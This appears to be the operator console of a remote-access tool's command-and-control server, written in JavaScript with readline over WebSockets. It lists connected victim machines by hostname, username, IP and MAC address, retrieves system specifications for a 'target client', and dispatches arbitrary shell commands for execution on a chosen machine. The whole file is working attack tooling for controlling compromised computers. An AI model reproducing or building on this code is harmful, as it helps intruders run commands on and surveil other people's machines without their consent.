import readline from "readline";
import Logger from "./logger.js";

const colors = {
  reset: "\x1b[0m",
  blue: "\x1b[34m",
  cyan: "\x1b[36m",
  yellow: "\x1b[33m",
  green: "\x1b[32m",
};

class CLI {
  constructor(wsServer) {
    this.wsServer = wsServer;
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout,
    });
  }

  start() {
    console.log(
      `\n${colors.cyan}============================ SECURE SERVER CONTROL INTERFACE ============================${colors.reset}`
    );
    this.showMenu();
    console.log(
      `${colors.cyan}=========================================================================================${colors.reset}\n`
    );

    this.rl.setPrompt("> ");
    this.rl.prompt();

    this.rl.on("line", (line) => {
      const [command, ...args] = line.trim().split(" ");
      this.handleCommand(command, args);
      this.rl.prompt();
    });

    this.rl.on("close", () => {
      process.exit(0);
    });
  }

  handleCommand(command, args) {
    switch (command) {
      case "list":
        this.handleList();
        break;
      case "info":
        this.handleDetails(args[0]);
        break;
      case "send":
        this.handleSend(args.join(" "));
        break;
      case "shell":
        this.handleShell(args[0], args.slice(1).join(" "));
        break;
      case "cmd":
        this.handleShell(args[0], args.slice(1).join(" "));
        break;
      case "exit":
        this.handleExit();
        break;
      case "?":
        this.showMenu();
        break;
      default:
        console.log("Invalid command. Type '?' to view available commands.");
    }
  }

  showMenu() {
    console.log(`\n${colors.blue}Available Commands:${colors.reset}\n`);
    console.log(
      `${colors.yellow}  list${colors.reset}              	- Display active client sessions`
    );
    console.log(
      `${colors.yellow}  info <client_id>${colors.reset}    	- Retrieve comprehensive system specifications for target client`
    );
    console.log(
      `${colors.yellow}  send <message>${colors.reset}    	- Broadcast secure message to all authenticated clients`
    );
    console.log(
      `${colors.yellow}  shell <id> <cmd>${colors.reset}  	- Execute shell command on target client`
    );
    console.log(
      `${colors.yellow}  cmd <id> <cmd>${colors.reset}    	- Alias for shell command`
    );
    console.log(
      `${colors.yellow}  exit${colors.reset}              	- Terminate server session`
    );
    console.log(
      `${colors.yellow}  ?${colors.reset}                 	- Display command interface menu`
    );
    console.log("");
  }

  handleList() {
    const clients = this.wsServer.getClientDetails();
    if (clients.length === 0) {
      console.log("No active client sessions detected");
      return;
    }

    console.log(`\n${colors.blue}Active Client Sessions:${colors.reset}\n`);
    console.log(
      `${colors.cyan}ID     | Hostname      | Username    | IP             | MAC               ${colors.reset}`
    );
    console.log(
      `${colors.cyan}-------+---------------|-------------|----------------+-------------------${colors.reset}`
    );
    clients.forEach((client) => {
      const [hostname, username] = client.id.split("-");
      console.log(
        `${colors.green}${client.shortId.padEnd(6)}${colors.reset} | ` +
          `${hostname.padEnd(12)}  | ` +
          `${username.padEnd(10)}  | ` +
          `${client.ip.padEnd(14)} | ` +
          `${client.mac}  `
      );
    });
    console.log("");
  }

  handleDetails(clientId) {
    if (!clientId) {
      console.log("Client identifier required. Usage: info <client_id>\n");
      return;
    }

    const clients = this.wsServer.getClientDetails();
    const client = clients.find(
      (c) => c.id === clientId || c.shortId === clientId.toUpperCase()
    );

    if (!client) {
      console.log(`Target client "${clientId}" not found in active sessions.`);
      return;
    }

    const [hostname, username] = client.id.split("-");
    console.log(`\n${colors.blue}Target Client Details:${colors.reset}\n`);
    console.log(`${colors.cyan}Property    | Value${colors.reset}`);
    console.log(`${colors.cyan}------------+${"-".repeat(50)}${colors.reset}`);
    console.log(
      `Session ID  | ${colors.green}${client.shortId}${colors.reset}`
    );
    console.log(`Hostname    | ${hostname}`);
    console.log(`Username    | ${username}`);
    console.log(`IP Address  | ${client.ip}`);
    console.log(`MAC Address | ${client.mac}`);
    console.log(`Connected   | ${client.connectedAt}`);
    console.log(`OS          | ${client.os}`);
    console.log(`Platform    | ${client.platform}`);
    console.log(`CPU Arch    | ${client.arch}`);
    console.log(`Memory      | ${client.memory}`);
    console.log(`Processor   | ${client.cpu}`);
    console.log("");
  }

  handleSend(message) {
    if (!message) {
      console.log("Message payload required for transmission");
      return;
    }

    this.wsServer.broadcast(message);
    console.log(
      `${colors.green}Secure message broadcast initiated${colors.reset}`
    );
  }

  handleShell(clientId, command) {
    if (!clientId || !command) {
      console.log("Usage: shell <client_id> <command>\n");
      return;
    }

    const clients = this.wsServer.getClients();
    const client = clients.find(
      (c) => c.id === clientId || c.shortId === clientId.toUpperCase()
    );

    if (!client) {
      console.log(
        `Target client "${clientId}" not found in active sessions.\n`
      );
      return;
    }

    this.wsServer.sendToClient(client.id, {
      type: "shell",
      command: command,
    });
    console.log(
      `${colors.green}Shell command dispatched to client ${colors.yellow}${client.shortId}${colors.reset}\n`
    );
  }

  handleExit() {
    console.log(
      `${colors.yellow}Initiating secure server termination sequence...${colors.reset}`
    );
    this.rl.close();
  }
}

export default CLI;
